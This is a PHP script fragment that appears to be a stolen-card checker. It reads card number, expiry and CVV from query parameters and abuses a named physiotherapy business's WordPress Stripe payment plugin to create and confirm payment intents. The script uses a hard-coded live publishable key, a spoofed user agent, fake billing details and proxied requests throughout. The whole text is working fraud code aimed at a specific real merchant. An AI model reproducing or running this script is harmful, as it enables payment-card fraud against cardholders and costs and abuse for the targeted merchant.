...
extract($_GET);
//lista = "47450340230805997|04|2024|000";
...
$pkey = "pk_live_tfp6HYdpWP57stMNC40pImsi";
$tokens = "a6a5a36a3f317624eb04776af3abf930";
$prod_id = "5997";
$amnt = 1;
$curr = "USD";
$ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
$referrer = "https://bodybalancephysiotherapy.ie/asp-payment-box/?product_id=5997";
$site  = "https://bodybalancephysiotherapy.ie/wp-admin/admin-ajax.php";
$tries = $tries + 1;
$cookie = RandomString();
...
if (empty($sid)) {
 ...
 $getPI =  cURL(
    ...
    'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=100&curr=USD&product_id='.$prod_id.'&quantity=1&billing_details={"name":"asdasd asdasd","email":"sadsad@gmail.com"}&token='.$tokens,
    "POST",
    1,
    $cookie 
...
if (strpos($token_method, '"id": "tok_')) {
   ...
   $execute =  cURL_ProxyOn(    
       ...
       'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id='.$prod_id.'&pi_id='.$pi_id.'&token='.$tokens.'&opts={"save_payment_method":true,"setup_future_usage":"off_session","payment_method_data":{"type":"card","card":{"token":"'.$token.'"}}}',
       "POST",
       1,
       $cookie
   );
